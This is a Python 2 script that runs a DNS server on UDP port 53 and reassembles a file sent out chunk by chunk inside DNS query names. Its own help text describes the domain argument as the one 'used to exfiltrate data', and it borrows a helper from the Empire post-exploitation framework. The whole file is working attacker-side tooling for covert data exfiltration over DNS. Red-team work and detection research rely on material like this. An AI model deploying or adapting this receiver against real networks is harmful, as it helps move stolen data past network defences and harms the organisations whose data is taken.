#!/usr/bin/python
# -*- coding: utf8 -*-
import argparse
import socket
from dnslib import *
from base64 import b64encode, b64decode
import sys

#======================================================================================================
#											HELPERS FUNCTIONS
#======================================================================================================

#------------------------------------------------------------------------
def progress(count, total, status=''):
	"""
	Print a progress bar - https://gist.github.com/vladignatyev/06860ec2040cb497f0f3
	"""
	bar_len = 60
	filled_len = int(round(bar_len * count / float(total)))

	percents = round(100.0 * count / float(total), 1)
	bar = '=' * filled_len + '-' * (bar_len - filled_len)
	sys.stdout.write('[%s] %s%s ...%s\r' % (bar, percents, '%', status))
	sys.stdout.flush()

#------------------------------------------------------------------------
def decode(msg):
	msg = msg.replace('_','/').replace('-','+')
	if len(msg)%4 == 3:
		return b64decode(msg + '=')
	elif len(msg)%4 == 2:
		return b64decode(msg + '==')
	else:
		return b64decode(msg)
			
#------------------------------------------------------------------------
def color(string, color=None):
    """
    Author: HarmJ0y, borrowed from Empire
    Change text color for the Linux terminal.
    """
    
    attr = []
    # bold
    attr.append('1')
    
    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)

    else:
        if string.strip().startswith("[!]"):
            attr.append('31')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[+]"):
            attr.append('32')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[?]"):
            attr.append('33')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[*]"):
            attr.append('34')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        else:
            return string

#======================================================================================================
#											MAIN FUNCTION
#======================================================================================================
if __name__ == '__main__':

	#------------------------------------------------------------------------
	# Parse arguments
	parser = argparse.ArgumentParser()
	parser.add_argument("-d", "--domain", help="The domain name used to exfiltrate data", dest="domainName", required=True)
	args = parser.parse_args() 

	# Setup a UDP server listening on port UDP 53	
	udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	udps.bind(('',53))
	print color("[*] DNS server listening on port 53")
	
	try:
		count = 1
		fileData = ''
		while True:
			data, addr = udps.recvfrom(1024)
			request = DNSRecord.parse(data)
			qname = str(request.q.qname)
			#print color("[+] Received query: [{}] - Type: [{}]".format(qname, request.q.qtype))
						
			#-----------------------------------------------------------------------------
			# Check if it is the initialization request
			if qname.startswith("init."):
				msg = decode(qname.split(".")[1])
				
				fileName = msg.split('|')[0]
				nbChunks = int(msg.split('|')[1])
				
				print color("[+] Receiving file [{}] as a ZIP file in [{}] chunks".format(fileName,nbChunks))
				
				reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)	
				reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("OK")))
			#-----------------------------------------------------------------------------
			# Else, start receiving the file, chunk by chunk
			else:
				fileData += qname[0:-(len(args.domainName)+2)].replace('.','')
				progress(count, nbChunks, "Receiving file")
				
				reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)	
				reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(str(count))))
				
				if count == nbChunks:
					print '\n'
					try:
						outputFileName = fileName + ".zip"
						with open(outputFileName, 'w+') as fileHandle:
							fileHandle.write(decode(fileData))
							fileHandle.close()
							print color("[+] Output file [{}] saved successfully".format(outputFileName))
					except IOError:
						print color("[!] Could not write file [{}]".format(outputFileName))				
				else:
					count += 1

			#-----------------------------------------------------------------------------		
			# Finally send the response back
			udps.sendto(reply.pack(), addr)
	except KeyboardInterrupt:
		pass
	finally:
		print color("[!] Stopping DNS Server")
		udps.close()
